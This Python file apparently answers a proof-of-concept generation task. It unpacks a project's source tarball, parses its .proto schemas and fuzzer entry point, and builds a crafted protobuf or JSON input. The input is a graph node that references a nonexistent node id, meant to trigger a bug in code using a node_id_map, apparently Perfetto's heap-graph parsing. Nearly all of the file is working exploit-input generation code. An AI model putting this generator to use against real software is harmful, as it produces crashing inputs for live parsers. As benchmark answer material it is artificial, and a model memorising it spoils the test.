import os
import re
import tarfile
import tempfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Set, Iterable, Any


# ---------------- Protobuf encoding helpers ----------------

_SCALAR_WIRE_TYPES = {
    "int32": 0,
    "uint32": 0,
    "int64": 0,
    "uint64": 0,
    "sint32": 0,
    "sint64": 0,
    "bool": 0,
    "enum": 0,
    "fixed64": 1,
    "sfixed64": 1,
    "double": 1,
    "string": 2,
    "bytes": 2,
    "fixed32": 5,
    "sfixed32": 5,
    "float": 5,
}

_VARINT_TYPES = {
    "int32",
    "uint32",
    "int64",
    "uint64",
    "sint32",
    "sint64",
    "bool",
    "enum",
}

_ZIGZAG_TYPES = {"sint32", "sint64"}

_FIXED32_TYPES = {"fixed32", "sfixed32", "float"}
_FIXED64_TYPES = {"fixed64", "sfixed64", "double"}


def _encode_varint(n: int) -> bytes:
    if n < 0:
        n &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _zigzag32(n: int) -> int:
    return (n << 1) ^ (n >> 31)


def _zigzag64(n: int) -> int:
    return (n << 1) ^ (n >> 63)


def _encode_key(field_number: int, wire_type: int) -> bytes:
    return _encode_varint((field_number << 3) | wire_type)


def _encode_fixed32(n: int) -> bytes:
    n &= 0xFFFFFFFF
    return bytes((n & 0xFF, (n >> 8) & 0xFF, (n >> 16) & 0xFF, (n >> 24) & 0xFF))


def _encode_fixed64(n: int) -> bytes:
    n &= 0xFFFFFFFFFFFFFFFF
    return bytes(
        (
            n & 0xFF,
            (n >> 8) & 0xFF,
            (n >> 16) & 0xFF,
            (n >> 24) & 0xFF,
            (n >> 32) & 0xFF,
            (n >> 40) & 0xFF,
            (n >> 48) & 0xFF,
            (n >> 56) & 0xFF,
        )
    )


def _encode_length_delimited(b: bytes) -> bytes:
    return _encode_varint(len(b)) + b


def _is_scalar_type(t: str) -> bool:
    t = t.strip()
    t = t.split(".")[-1]
    if t.startswith("map<"):
        return False
    return t in _SCALAR_WIRE_TYPES


def _is_message_type(t: str) -> bool:
    t = t.strip()
    if t.startswith("map<"):
        return False
    base = t.split(".")[-1]
    return base not in _SCALAR_WIRE_TYPES and base not in ("group",)


# ---------------- Simple .proto parser ----------------

@dataclass(frozen=True)
class FieldDef:
    name: str
    number: int
    type_name: str
    label: str  # "repeated", "optional", "required", ""
    parent_fullname: str

    def base_type(self) -> str:
        return self.type_name.strip().split(".")[-1]


@dataclass
class MessageDef:
    full_name: str
    fields_by_name: Dict[str, FieldDef]
    fields: List[FieldDef]
    package: str


class ProtoRegistry:
    def __init__(self) -> None:
        self.messages: Dict[str, MessageDef] = {}
        self.name_to_full: Dict[str, List[str]] = {}

    def add_message(self, m: MessageDef) -> None:
        self.messages[m.full_name] = m
        simple = m.full_name.split(".")[-1]
        self.name_to_full.setdefault(simple, []).append(m.full_name)

    def resolve_message_name(self, name: str, scope_fullname: Optional[str] = None, package: Optional[str] = None) -> Optional[str]:
        name = name.strip()
        if not name:
            return None
        if name.startswith("."):
            cand = name[1:]
            return cand if cand in self.messages else None
        if name in self.messages:
            return name

        # If name is qualified but not rooted, try package prefix.
        if "." in name:
            if package:
                cand = f"{package}.{name}"
                if cand in self.messages:
                    return cand
            # Try direct suffix match
            for full in self.messages.keys():
                if full.endswith("." + name):
                    return full
            return None

        # Try nested resolution from scope: walk up scopes.
        if scope_fullname:
            parts = scope_fullname.split(".")
            for i in range(len(parts), 0, -1):
                cand = ".".join(parts[:i] + [name])
                if cand in self.messages:
                    return cand

        # Try package resolution.
        if package:
            cand = f"{package}.{name}"
            if cand in self.messages:
                return cand

        # Fallback by simple name match.
        cands = self.name_to_full.get(name)
        if not cands:
            return None
        if len(cands) == 1:
            return cands[0]

        # Prefer perfetto-ish names.
        pref_order = ("perfetto", "protos", "trace", "processor")
        def score_full(full: str) -> Tuple[int, int]:
            s = 0
            for p in pref_order:
                if p in full:
                    s += 1
            # shorter is often better
            return (s, -len(full))

        cands_sorted = sorted(cands, key=score_full, reverse=True)
        return cands_sorted[0] if cands_sorted else None

    def resolve_field_message_type(self, f: FieldDef, current_message: MessageDef) -> Optional[str]:
        if not _is_message_type(f.type_name):
            return None
        return self.resolve_message_name(f.type_name, scope_fullname=current_message.full_name, package=current_message.package)


_PROTO_COMMENT_BLOCK_RE = re.compile(r"/\*.*?\*/", re.S)
_PROTO_LINE_COMMENT_RE = re.compile(r"//.*?$", re.M)
_PROTO_PACKAGE_RE = re.compile(r"\bpackage\s+([a-zA-Z_][\w.]*)\s*;")
_PROTO_MESSAGE_START_RE = re.compile(r"\bmessage\s+([A-Za-z_]\w*)\s*\{")
_PROTO_ENUM_START_RE = re.compile(r"\benum\s+([A-Za-z_]\w*)\s*\{")
_PROTO_ONEOF_START_RE = re.compile(r"\boneof\s+([A-Za-z_]\w*)\s*\{")
_PROTO_FIELD_RE = re.compile(
    r"""
    (?:
      \b(optional|required|repeated)\b\s+
    )?
    ([A-Za-z_][\w.<> ,]*?)\s+
    ([A-Za-z_]\w*)\s*=\s*
    (\d+)
    (?:\s*\[[^\]]*\])?
    \s*;
    """,
    re.X,
)


def _strip_proto_comments(s: str) -> str:
    s = _PROTO_COMMENT_BLOCK_RE.sub("", s)
    s = _PROTO_LINE_COMMENT_RE.sub("", s)
    return s


def _parse_proto_file(path: str, registry: ProtoRegistry) -> None:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            data = f.read()
    except Exception:
        return
    data = _strip_proto_comments(data)
    pkg_m = _PROTO_PACKAGE_RE.search(data)
    package = pkg_m.group(1) if pkg_m else ""

    # We implement a simple brace-based parse to detect message nesting.
    i = 0
    n = len(data)
    stack: List[Tuple[str, int, Dict[str, FieldDef], List[FieldDef]]] = []
    # stack entries: (full_name, brace_level, fields_by_name, fields_list)
    brace_level = 0

    # Precompute indices of tokens to avoid quadratic scans.
    # We'll scan character by character and detect message starts at positions.
    while i < n:
        ch = data[i]
        if ch == "{":
            brace_level += 1
            i += 1
            continue
        if ch == "}":
            # Close any message whose brace_level matches.
            brace_level -= 1
            while stack and stack[-1][1] > brace_level:
                full_name, _, fbn, fl = stack.pop()
                mdef = MessageDef(full_name=full_name, fields_by_name=fbn, fields=fl, package=package)
                registry.add_message(mdef)
            i += 1
            continue

        # Detect message start at this position.
        m = _PROTO_MESSAGE_START_RE.match(data, i)
        if m:
            name = m.group(1)
            if stack:
                parent_full = stack[-1][0]
                full_name = f"{parent_full}.{name}"
            else:
                full_name = f"{package}.{name}" if package else name
            # message's content begins after '{' which will increment brace_level soon.
            # Our stack stores expected inner brace_level after reading '{' => current+1
            # But since we haven't consumed '{' yet, compute as brace_level+1.
            stack.append((full_name, brace_level + 1, {}, []))
            i = m.end()
            continue

        # Skip enum/oneof starts (fields still parsed by regex; ok).
        em = _PROTO_ENUM_START_RE.match(data, i)
        if em:
            i = em.end()
            continue
        om = _PROTO_ONEOF_START_RE.match(data, i)
        if om:
            i = om.end()
            continue

        # Parse fields at this position if within a message.
        if stack:
            fm = _PROTO_FIELD_RE.match(data, i)
            if fm:
                label = fm.group(1) or ""
                type_name = (fm.group(2) or "").strip()
                field_name = fm.group(3)
                try:
                    num = int(fm.group(4))
                except Exception:
                    num = 0
                cur_full = stack[-1][0]
                fd = FieldDef(name=field_name, number=num, type_name=type_name, label=label, parent_fullname=cur_full)
                stack[-1][2][field_name] = fd
                stack[-1][3].append(fd)
                i = fm.end()
                continue

        i += 1

    # Close any open messages.
    while stack:
        full_name, _, fbn, fl = stack.pop()
        mdef = MessageDef(full_name=full_name, fields_by_name=fbn, fields=fl, package=package)
        registry.add_message(mdef)


def _parse_all_protos(root_dir: str) -> ProtoRegistry:
    reg = ProtoRegistry()
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            if fn.endswith(".proto"):
                _parse_proto_file(os.path.join(dirpath, fn), reg)
    return reg


# ---------------- Source scanning helpers ----------------

def _iter_text_files(root_dir: str, exts: Tuple[str, ...], max_bytes: int = 2_000_000) -> Iterable[Tuple[str, str]]:
    for dirpath, _, filenames in os.walk(root_dir):
        for fn in filenames:
            if not fn.lower().endswith(exts):
                continue
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
                if st.st_size > max_bytes:
                    continue
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    yield path, f.read()
            except Exception:
                continue


def _find_first_file_containing(root_dir: str, needle: str, exts: Tuple[str, ...]) -> Optional[Tuple[str, str]]:
    for path, txt in _iter_text_files(root_dir, exts):
        if needle in txt:
            return path, txt
    return None


def _detect_root_message_from_fuzzer(root_dir: str) -> Optional[str]:
    # Prefer fuzzer entry points.
    for path, txt in _iter_text_files(root_dir, (".cc", ".cpp", ".c", ".h", ".hpp", ".mm")):
        if "LLVMFuzzerTestOneInput" not in txt and "FuzzerTestOneInput" not in txt:
            continue

        m = re.search(r"pbzero\s*::\s*([A-Za-z_]\w*)\s*::\s*Decoder\s+\w+\s*\(\s*data\s*,\s*size\s*\)", txt)
        if m:
            return m.group(1)

        m = re.search(
            r"\b([A-Za-z_]\w*)\s+([A-Za-z_]\w*)\s*;\s*\2\s*\.\s*ParseFromArray\s*\(\s*data\s*,\s*size\s*\)",
            txt,
            re.S,
        )
        if m:
            return m.group(1)

        m = re.search(
            r"\b([A-Za-z_]\w*)\s+([A-Za-z_]\w*)\s*;\s*.*?\2\s*\.\s*ParseFromString\s*\(\s*.*?data.*?size.*?\)",
            txt,
            re.S,
        )
        if m:
            return m.group(1)

    return None


def _detect_graph_message_from_node_id_map(root_dir: str) -> Optional[str]:
    hit = _find_first_file_containing(root_dir, "node_id_map", (".cc", ".cpp", ".c", ".h", ".hpp", ".mm"))
    if not hit:
        return None
    _, txt = hit
    # Look for pbzero decoders in same file.
    decs = re.findall(r"pbzero\s*::\s*([A-Za-z_]\w*)\s*::\s*Decoder", txt)
    # Rank decoders by likely relevance.
    if decs:
        def score(name: str) -> Tuple[int, int]:
            s = 0
            lname = name.lower()
            for kw in ("snapshot", "graph", "heap", "memory", "profile"):
                if kw in lname:
                    s += 2
            if "trace" in lname or "packet" in lname:
                s -= 1
            return (s, -len(name))
        decs_sorted = sorted(set(decs), key=score, reverse=True)
        return decs_sorted[0]
    # Fallback: find message type mentioned in comments/identifiers
    m = re.search(r"\b([A-Za-z_]\w*Snapshot|[A-Za-z_]\w*Graph)\b", txt)
    if m:
        return m.group(1)
    return None


# ---------------- Schema inference ----------------

@dataclass
class GraphSchema:
    graph_full: str
    nodes_field: FieldDef
    node_full: str
    node_id_field: FieldDef
    # reference encoding options:
    node_refs_field: FieldDef
    # Either ref message:
    ref_full: Optional[str]
    ref_target_field: Optional[FieldDef]
    # Or direct repeated scalar ids (no ref_full/ref_target_field):
    direct_ref_ids: bool


def _field_is_varint_like(f: FieldDef) -> bool:
    bt = f.base_type()
    if bt in _VARINT_TYPES:
        return True
    # enums treated as varint; we don't parse enums well, but consider typical "FooType" ends with "Type"
    return bt not in _SCALAR_WIRE_TYPES and bt not in ("string", "bytes")


def _encode_scalar_by_type(type_base: str, value: Any) -> Optional[Tuple[int, bytes]]:
    t = type_base
    if t in _VARINT_TYPES:
        wire = 0
        iv = int(value)
        if t in _ZIGZAG_TYPES:
            if t == "sint32":
                iv = _zigzag32(iv)
            else:
                iv = _zigzag64(iv)
        return wire, _encode_varint(iv)
    if t in _FIXED32_TYPES:
        wire = 5
        return wire, _encode_fixed32(int(value))
    if t in _FIXED64_TYPES:
        wire = 1
        return wire, _encode_fixed64(int(value))
    if t == "string":
        wire = 2
        vb = value.encode("utf-8") if isinstance(value, str) else bytes(value)
        return wire, _encode_length_delimited(vb)
    if t == "bytes":
        wire = 2
        vb = bytes(value)
        return wire, _encode_length_delimited(vb)
    return None


def _encode_field_by_def(reg: ProtoRegistry, msg: MessageDef, f: FieldDef, value: Any) -> bytes:
    bt = f.base_type()
    if _is_message_type(f.type_name):
        # value must be bytes (submessage)
        b = bytes(value)
        return _encode_key(f.number, 2) + _encode_length_delimited(b)
    # scalar
    enc = _encode_scalar_by_type(bt, value)
    if enc is None:
        # treat unknown as varint
        return _encode_key(f.number, 0) + _encode_varint(int(value))
    wire, payload = enc
    return _encode_key(f.number, wire) + payload


def _encode_message(reg: ProtoRegistry, msg: MessageDef, fields: List[Tuple[FieldDef, Any]]) -> bytes:
    out = bytearray()
    for f, v in fields:
        # if repeated scalar and v is list -> encode each occurrence
        if f.label == "repeated" and isinstance(v, (list, tuple)):
            for item in v:
                out += _encode_field_by_def(reg, msg, f, item)
        else:
            out += _encode_field_by_def(reg, msg, f, v)
    return bytes(out)


def _pick_id_field(node_msg: MessageDef) -> Optional[FieldDef]:
    # Prefer exact "id", then "*_id" excluding "type_id"/"field_id"
    if "id" in node_msg.fields_by_name:
        return node_msg.fields_by_name["id"]
    candidates = []
    for f in node_msg.fields:
        lname = f.name.lower()
        if not _field_is_varint_like(f):
            continue
        if lname.endswith("_id") or lname == "nodeid" or lname.endswith("id"):
            if "type_id" in lname or "field_id" in lname or "name_id" in lname:
                continue
            candidates.append(f)
    if candidates:
        def score(f: FieldDef) -> Tuple[int, int]:
            lname = f.name.lower()
            s = 0
            if lname.endswith("_id") or lname == "node_id":
                s += 2
            if lname == "node_id":
                s += 2
            if "object" in lname:
                s += 1
            return (s, -f.number)
        candidates.sort(key=score, reverse=True)
        return candidates[0]
    # Any varint-like field with name "id" variants
    for f in node_msg.fields:
        if _field_is_varint_like(f) and "id" in f.name.lower():
            return f
    return None


def _pick_nodes_field(graph_msg: MessageDef, reg: ProtoRegistry) -> Optional[Tuple[FieldDef, str]]:
    # Choose repeated message field whose name contains "node"
    candidates: List[Tuple[FieldDef, str, int]] = []
    for f in graph_msg.fields:
        if f.label != "repeated":
            continue
        if not _is_message_type(f.type_name):
            continue
        ftype = reg.resolve_field_message_type(f, graph_msg)
        if not ftype:
            continue
        lname = f.name.lower()
        if "node" not in lname:
            continue
        score = 0
        if lname == "nodes":
            score += 5
        if lname == "node":
            score += 4
        if "heap" in graph_msg.full_name.lower() and "heap" in ftype.lower():
            score += 1
        if ftype.lower().endswith(".node") or ftype.split(".")[-1].lower().endswith("node"):
            score += 2
        candidates.append((f, ftype, score))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (x[2], -x[0].number), reverse=True)
    return candidates[0][0], candidates[0][1]


def _pick_refs_field(node_msg: MessageDef, reg: ProtoRegistry) -> Optional[Tuple[FieldDef, Optional[str], Optional[FieldDef], bool]]:
    # Returns (refs_field, ref_msg_full, target_field, direct_ref_ids)
    # First, repeated message refs/edges.
    msg_candidates: List[Tuple[FieldDef, str, int]] = []
    scalar_candidates: List[Tuple[FieldDef, int]] = []

    for f in node_msg.fields:
        if f.label != "repeated":
            continue
        lname = f.name.lower()
        score = 0
        if "ref" in lname or "edge" in lname or "child" in lname:
            score += 3
        if "reference" in lname:
            score += 2
        if "edges" == lname or "references" == lname:
            score += 3

        if _is_message_type(f.type_name):
            ftype = reg.resolve_field_message_type(f, node_msg)
            if not ftype:
                continue
            if score == 0 and "node" in lname:
                continue
            msg_candidates.append((f, ftype, score))
        else:
            bt = f.base_type()
            if bt in _VARINT_TYPES and ("id" in lname or "ref" in lname or "edge" in lname):
                scalar_candidates.append((f, score))

    def pick_target_field(ref_msg: MessageDef) -> Optional[FieldDef]:
        # Find a varint id-like field that represents target node/object.
        prefs = [
            "owned_object_id",
            "to_object_id",
            "target_object_id",
            "target_node_id",
            "referenced_object_id",
            "reference_object_id",
            "referent_object_id",
            "node_id",
            "object_id",
            "to",
            "target",
            "dst",
            "dest",
            "id",
        ]
        candidates: List[Tuple[FieldDef, int]] = []
        for f in ref_msg.fields:
            if not _field_is_varint_like(f):
                continue
            lname = f.name.lower()
            if "field_id" in lname or "name_id" in lname or "type_id" in lname:
                continue
            score = 0
            for idx, p in enumerate(prefs):
                if lname == p:
                    score = 100 - idx
                    break
                if p in lname:
                    score = max(score, 50 - idx)
            if score == 0 and lname.endswith("_id"):
                score = 10
            candidates.append((f, score))
        if not candidates:
            return None
        candidates.sort(key=lambda x: (x[1], -x[0].number), reverse=True)
        return candidates[0][0]

    # Prefer message refs if we can locate a good target field.
    msg_candidates.sort(key=lambda x: (x[2], -x[0].number), reverse=True)
    for f, ref_full, _ in msg_candidates:
        ref_msg = reg.messages.get(ref_full)
        if not ref_msg:
            continue
        tgt = pick_target_field(ref_msg)
        if tgt:
            return f, ref_full, tgt, False

    # Fall back to direct repeated scalar ids.
    if scalar_candidates:
        scalar_candidates.sort(key=lambda x: (x[1], -x[0].number), reverse=True)
        f = scalar_candidates[0][0]
        return f, None, None, True

    return None


def _infer_graph_schema(reg: ProtoRegistry, root_full: Optional[str] = None, preferred_graph_simple: Optional[str] = None) -> Optional[GraphSchema]:
    # Optionally select a candidate graph message (preferred_graph_simple), else search.
    candidates: List[Tuple[int, GraphSchema]] = []

    def can_reach(from_full: str, to_full: str) -> Optional[List[FieldDef]]:
        if from_full == to_full:
            return []
        # BFS over message edges.
        q: List[str] = [from_full]
        prev: Dict[str, Tuple[str, FieldDef]] = {}
        seen: Set[str] = {from_full}
        while q:
            cur = q.pop(0)
            cur_msg = reg.messages.get(cur)
            if not cur_msg:
                continue
            for f in cur_msg.fields:
                if not _is_message_type(f.type_name):
                    continue
                nxt = reg.resolve_field_message_type(f, cur_msg)
                if not nxt or nxt in seen:
                    continue
                seen.add(nxt)
                prev[nxt] = (cur, f)
                if nxt == to_full:
                    # reconstruct
                    path_fields: List[FieldDef] = []
                    x = nxt
                    while x != from_full:
                        p, pf = prev[x]
                        path_fields.append(pf)
                        x = p
                    path_fields.reverse()
                    return path_fields
                q.append(nxt)
        return None

    msg_fulls: List[str]
    if preferred_graph_simple:
        pref_full = reg.resolve_message_name(preferred_graph_simple, package=None, scope_fullname=None)
        msg_fulls = [pref_full] if pref_full else []
    else:
        msg_fulls = list(reg.messages.keys())

    for graph_full in msg_fulls:
        if not graph_full or graph_full not in reg.messages:
            continue
        graph_msg = reg.messages[graph_full]
        pick_nodes = _pick_nodes_field(graph_msg, reg)
        if not pick_nodes:
            continue
        nodes_field, node_full = pick_nodes
        node_msg = reg.messages.get(node_full)
        if not node_msg:
            continue
        node_id_f = _pick_id_field(node_msg)
        if not node_id_f:
            continue
        refs_pick = _pick_refs_field(node_msg, reg)
        if not refs_pick:
            continue
        node_refs_f, ref_full, tgt_f, direct_ref_ids = refs_pick

        # Basic score
        score = 0
        score += 10
        score += 10 if "graph" in graph_full.lower() or "snapshot" in graph_full.lower() else 0
        score += 10 if "node" in nodes_field.name.lower() else 0
        score += 10 if node_id_f.name.lower() in ("id", "node_id", "object_id") else 5
        score += 10 if ("ref" in node_refs_f.name.lower() or "edge" in node_refs_f.name.lower()) else 0
        if ref_full and tgt_f:
            score += 20
            if "id" in tgt_f.name.lower():
                score += 5
        if direct_ref_ids:
            score += 10

        # Reachability from root
        path_len_penalty = 0
        if root_full and root_full in reg.messages:
            path_fields = can_reach(root_full, graph_full)
            if path_fields is None:
                continue
            path_len_penalty = len(path_fields)

        score -= path_len_penalty

        schema = GraphSchema(
            graph_full=graph_full,
            nodes_field=nodes_field,
            node_full=node_full,
            node_id_field=node_id_f,
            node_refs_field=node_refs_f,
            ref_full=ref_full,
            ref_target_field=tgt_f,
            direct_ref_ids=direct_ref_ids,
        )
        candidates.append((score, schema))

    if not candidates:
        # if preferred failed, try all messages.
        if preferred_graph_simple:
            return _infer_graph_schema(reg, root_full=root_full, preferred_graph_simple=None)
        return None

    candidates.sort(key=lambda x: x[0], reverse=True)
    return candidates[0][1]


def _find_wrap_path(reg: ProtoRegistry, root_full: str, target_full: str) -> Optional[List[Tuple[str, FieldDef, str]]]:
    # returns list of edges: (parent_full, field_def, child_full)
    if root_full == target_full:
        return []
    q: List[str] = [root_full]
    prev: Dict[str, Tuple[str, FieldDef]] = {}
    seen: Set[str] = {root_full}
    while q:
        cur = q.pop(0)
        cur_msg = reg.messages.get(cur)
        if not cur_msg:
            continue
        for f in cur_msg.fields:
            if not _is_message_type(f.type_name):
                continue
            nxt = reg.resolve_field_message_type(f, cur_msg)
            if not nxt or nxt in seen:
                continue
            seen.add(nxt)
            prev[nxt] = (cur, f)
            if nxt == target_full:
                # reconstruct
                edges: List[Tuple[str, FieldDef, str]] = []
                x = nxt
                while x != root_full:
                    p, pf = prev[x]
                    edges.append((p, pf, x))
                    x = p
                edges.reverse()
                return edges
            q.append(nxt)
    return None


def _build_graph_payload(reg: ProtoRegistry, schema: GraphSchema) -> bytes:
    graph_msg = reg.messages[schema.graph_full]
    node_msg = reg.messages[schema.node_full]

    missing_target_id = 2
    existing_node_id = 1

    node_fields: List[Tuple[FieldDef, Any]] = []
    node_fields.append((schema.node_id_field, existing_node_id))

    if schema.direct_ref_ids:
        # Put a repeated scalar reference id list containing a missing id.
        node_fields.append((schema.node_refs_field, [missing_target_id]))
    else:
        ref_full = schema.ref_full
        tgt_f = schema.ref_target_field
        if not ref_full or not tgt_f:
            # fallback: direct ref ids if possible
            node_fields.append((schema.node_refs_field, [missing_target_id]))
        else:
            ref_msg = reg.messages[ref_full]
            ref_bytes = _encode_message(reg, ref_msg, [(tgt_f, missing_target_id)])
            node_fields.append((schema.node_refs_field, ref_bytes))

    node_bytes = _encode_message(reg, node_msg, node_fields)

    graph_fields: List[Tuple[FieldDef, Any]] = []
    graph_fields.append((schema.nodes_field, node_bytes))

    # Optionally add common required-ish metadata fields if present (pid/ts/etc).
    meta_names = ("pid", "upid", "process_id", "timestamp", "ts", "snapshot_id", "seq_id", "sequence_id")
    for f in graph_msg.fields:
        lname = f.name.lower()
        if lname in meta_names or any(lname == mn for mn in meta_names):
            if _is_message_type(f.type_name):
                continue
            bt = f.base_type()
            if bt in _VARINT_TYPES or bt in _FIXED32_TYPES or bt in _FIXED64_TYPES:
                # Avoid duplicating nodes field, and avoid huge fields
                if f.name == schema.nodes_field.name:
                    continue
                # Avoid fields that look like "node_*" to not confuse parsing
                if "node" in lname:
                    continue
                graph_fields.append((f, 1))

    return _encode_message(reg, graph_msg, graph_fields)


def _wrap_payload(reg: ProtoRegistry, root_full: str, target_full: str, target_bytes: bytes) -> bytes:
    path = _find_wrap_path(reg, root_full, target_full)
    if path is None:
        # If we cannot find a path, return target as-is.
        return target_bytes
    cur_bytes = target_bytes
    for parent_full, field_def, _child_full in reversed(path):
        parent_msg = reg.messages.get(parent_full)
        if not parent_msg:
            cur_bytes = _encode_key(field_def.number, 2) + _encode_length_delimited(cur_bytes)
        else:
            cur_bytes = _encode_message(reg, parent_msg, [(field_def, cur_bytes)])
    return cur_bytes


# ---------------- JSON fallback (best-effort) ----------------

def _build_json_fallback(root_dir: str) -> bytes:
    # Try to infer key names from code; fall back to common schema.
    vuln = _find_first_file_containing(root_dir, "node_id_map", (".cc", ".cpp", ".c", ".h", ".hpp", ".mm"))
    txt = vuln[1] if vuln else ""
    keys = set(re.findall(r'"([a-zA-Z_][a-zA-Z0-9_]*)"', txt))
    nodes_key = "nodes" if "nodes" in keys else ("node" if "node" in keys else "nodes")
    id_key = "id" if "id" in keys else ("node_id" if "node_id" in keys else "id")
    refs_key = "references" if "references" in keys else ("edges" if "edges" in keys else ("refs" if "refs" in keys else "references"))
    tgt_key = "node_id" if "node_id" in keys else ("target" if "target" in keys else ("to" if "to" in keys else id_key))

    # One node with id=1 referencing missing id=2.
    s = (
        '{'
        f'"{nodes_key}":[{{"{id_key}":1,"{refs_key}":[{{"{tgt_key}":2}}]}}]'
        '}'
    )
    return s.encode("utf-8")


# ---------------- Extraction ----------------

def _extract_tarball(src_path: str, dst_dir: str) -> None:
    with tarfile.open(src_path, "r:*") as tf:
        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

        for member in tf.getmembers():
            member_path = os.path.join(dst_dir, member.name)
            if not is_within_directory(dst_dir, member_path):
                continue
            try:
                tf.extract(member, dst_dir, set_attrs=False)
            except Exception:
                # Skip problematic entries.
                continue


# ---------------- Solution ----------------

class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            _extract_tarball(src_path, td)

            reg = _parse_all_protos(td)
            if not reg.messages:
                return _build_json_fallback(td)

            root_simple = _detect_root_message_from_fuzzer(td)
            graph_simple = _detect_graph_message_from_node_id_map(td)

            root_full: Optional[str] = None
            if root_simple:
                root_full = reg.resolve_message_name(root_simple, scope_fullname=None, package=None)

            if not root_full:
                # Common defaults
                for cand in ("Trace", "TracePacket", "ProfilePacket", "Input", "Snapshot"):
                    cf = reg.resolve_message_name(cand, scope_fullname=None, package=None)
                    if cf:
                        root_full = cf
                        break

            schema = _infer_graph_schema(reg, root_full=root_full, preferred_graph_simple=graph_simple)
            if not schema:
                # Try without root constraint
                schema = _infer_graph_schema(reg, root_full=None, preferred_graph_simple=graph_simple)
            if not schema:
                return _build_json_fallback(td)

            graph_bytes = _build_graph_payload(reg, schema)

            # If we have a root, wrap to root. Otherwise just return graph.
            if root_full and root_full in reg.messages:
                return _wrap_payload(reg, root_full, schema.graph_full, graph_bytes)

            return graph_bytes